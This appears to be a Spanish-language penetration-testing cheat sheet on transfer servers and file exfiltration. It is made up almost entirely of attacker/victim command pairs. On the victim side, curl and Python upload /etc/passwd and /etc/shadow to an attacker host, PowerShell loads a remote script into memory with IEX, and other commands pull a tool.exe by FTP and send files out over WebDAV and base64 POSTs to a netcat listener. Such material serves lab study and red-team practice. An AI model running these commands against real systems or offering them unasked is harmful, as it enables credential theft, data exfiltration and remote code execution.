---
title: "Servidores de Transferencia, WebDAV y Exfiltración por Código"
pubDate: '2026-08-26'
---

Guía para levantar servidores temporales de subida/descarga (HTTP, WebDAV, FTP, UploadServer) y exfiltrar información mediante código en múltiples plataformas.

---

## 🌐 1. Servidores Web Simples para Descargas Rápidas

```bash
# Python 3 (Por defecto puerto 8000)
python3 -m http.server 8000

# Python 2.7
python2.7 -m SimpleHTTPServer 8000

# PHP integrado
php -S 0.0.0.0:8000

# Ruby
ruby -run -ehttpd . -p8000
```

---

## 📤 2. Servidor de Subida de Archivos con Python (`uploadserver`)

Permite recibir archivos enviados mediante peticiones HTTP POST (multiparte):

### 1. ATACANTE: Levantar el UploadServer
```bash
pip3 install uploadserver
python3 -m uploadserver 8000
```

### 2. VÍCTIMA (Linux): Subida con cURL
```bash
# Subir un único archivo
curl -X POST http://10.10.10.32:8000/upload -F 'files=@/etc/passwd'

# Subir múltiples archivos en una sola petición
curl -X POST http://10.10.10.32:8000/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow'
```

### 3. VÍCTIMA (Linux / Scripting): Subida con Python `requests`
```bash
python3 -c 'import requests; requests.post("http://10.10.10.32:8000/upload", files={"files": open("/etc/passwd", "rb")})'
```

### 4. VÍCTIMA (Windows): Subida con `PSUpload.ps1`
```powershell
# Cargar módulo PSUpload en memoria
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

# Subir archivo al UploadServer
Invoke-FileUpload -Uri http://10.10.10.32:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

---

## 📁 3. Servidor WebDAV (Fallback SMB en Windows)

Cuando un cliente de Windows intenta conectar a una ruta UNC (`\\IP\recurso`) y el puerto SMB (445) está bloqueado por firewall, Windows realiza un *fallback* automático e intenta comunicarse vía WebDAV (HTTP puerto 80/443).

### 1. ATACANTE: Levantar Servidor WebDAV
```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

### 2. VÍCTIMA (Windows): Transferir Archivos
```cmd
:: Listar el contenido del WebDAV remoto (DavWWWRoot es la palabra clave de Windows)
dir \\10.10.10.32\DavWWWRoot

:: Copiar archivos locales hacia el atacante vía HTTP WebDAV
copy C:\Users\Administrator\Desktop\Secret.zip \\10.10.10.32\DavWWWRoot\
```

---

## 📦 4. Servidor FTP Temporal con Python (`pyftpdlib`)

### 1. ATACANTE: Levantar Servidor FTP con Permisos de Escritura
```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21 --write
```

### 2. VÍCTIMA: Operaciones de Descarga y Subida
```powershell
# Descargar vía PowerShell
(New-Object Net.WebClient).DownloadFile('ftp://10.10.10.32/tool.exe', 'C:\Users\Public\tool.exe')

# Subir (Exfiltrar) vía PowerShell
(New-Object Net.WebClient).UploadFile('ftp://10.10.10.32/exfiltrated.txt', 'C:\Windows\System32\drivers\etc\hosts')
```

---

## ⚡ 5. Exfiltración Rápida con Netcat y HTTP POST (Base64)

```bash
# 1. ATACANTE: Escuchar en puerto local
nc -lvnp 8000
```
```powershell
# 2. VÍCTIMA: Convertir archivo a Base64 y enviarlo en el cuerpo de una petición POST
$b64 = [Convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://10.10.10.32:8000/ -Method POST -Body $b64
```
```bash
# 3. ATACANTE: Decodificar el contenido recibido
echo "<STRING_BASE64_DEL_BODY>" | base64 -d > hosts
```
